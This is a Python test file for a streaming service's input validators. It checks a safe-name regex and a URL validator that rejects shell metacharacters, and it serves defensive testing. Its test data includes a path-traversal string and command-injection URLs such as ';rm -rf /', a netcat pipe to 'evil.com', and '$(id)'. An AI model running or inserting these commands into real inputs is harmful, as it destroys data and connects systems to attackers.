"""Basic security tests without external dependencies"""
import re

SAFE_NAME_RE = re.compile(r'^[A-Za-z0-9_.-]+$')

ALLOWED_URL_SCHEMES = {
    'rtmp://', 'rtsp://', 'http://', 'https://',
    'file://', 'srt://', 'udp://', 'tcp://'
}

DANGEROUS_CHARS = {
    '`', '$', ';', '|', '&', '<', '>', '"', "'",
    '\\', '\n', '\r', '\t', '(', ')', '[', ']',
    '{', '}', '*', '?', '!', '#', '~', '='
}


def validate_safe_name(value: str, field_name: str = "name") -> str:
    if not value or not SAFE_NAME_RE.fullmatch(value):
        raise ValueError(f'Invalid {field_name}: {value}')
    return value


def validate_input_url(url: str) -> str:
    if not url:
        raise ValueError("URL cannot be empty")

    url_lower = url.lower()
    if not any(url_lower.startswith(scheme) for scheme in ALLOWED_URL_SCHEMES):
        raise ValueError(f"Unsupported URL scheme")

    found_dangerous = [c for c in url if c in DANGEROUS_CHARS]
    if found_dangerous:
        raise ValueError("URL contains dangerous characters")

    if '$(' in url or '`' in url:
        raise ValueError("URL contains command substitution patterns")

    if ' >' in url or ' 1>' in url or ' 2>' in url or ' &>' in url:
        raise ValueError("URL contains shell redirection patterns")

    return url


def test_validate_safe_name():
    """Test safe name validation"""
    # Valid
    assert validate_safe_name("stream123") == "stream123"
    assert validate_safe_name("test-stream") == "test-stream"
    assert validate_safe_name("my_stream.name") == "my_stream.name"

    # Invalid
    try:
        validate_safe_name("../etc/passwd")
        assert False, "Should raise ValueError"
    except ValueError:
        pass

    try:
        validate_safe_name("stream with spaces")
        assert False, "Should raise ValueError"
    except ValueError:
        pass

    print("✓ validate_safe_name tests passed")


def test_validate_input_url():
    """Test URL validation"""
    # Valid URLs
    assert validate_input_url("rtmp://localhost/live/stream") == "rtmp://localhost/live/stream"
    assert validate_input_url("http://example.com/stream.flv") == "http://example.com/stream.flv"
    assert validate_input_url("https://example.com/secure/stream.m3u8") == "https://example.com/secure/stream.m3u8"

    # Empty URL
    try:
        validate_input_url("")
        assert False, "Should raise ValueError"
    except ValueError:
        pass

    # Command injection
    injection_urls = [
        "rtmp://localhost/live/stream;rm -rf /",
        "rtmp://localhost/live/stream && /bin/evil",
        "rtmp://localhost/live/stream | nc evil.com",
        "rtmp://localhost/live/stream `id`",
        "rtmp://localhost/live/stream$(id)",
    ]
    for url in injection_urls:
        try:
            validate_input_url(url)
            assert False, f"Should raise ValueError for: {url}"
        except ValueError:
            pass

    print("✓ validate_input_url tests passed")


if __name__ == "__main__":
    test_validate_safe_name()
    test_validate_input_url()
    print()
    print("All basic security tests passed!")
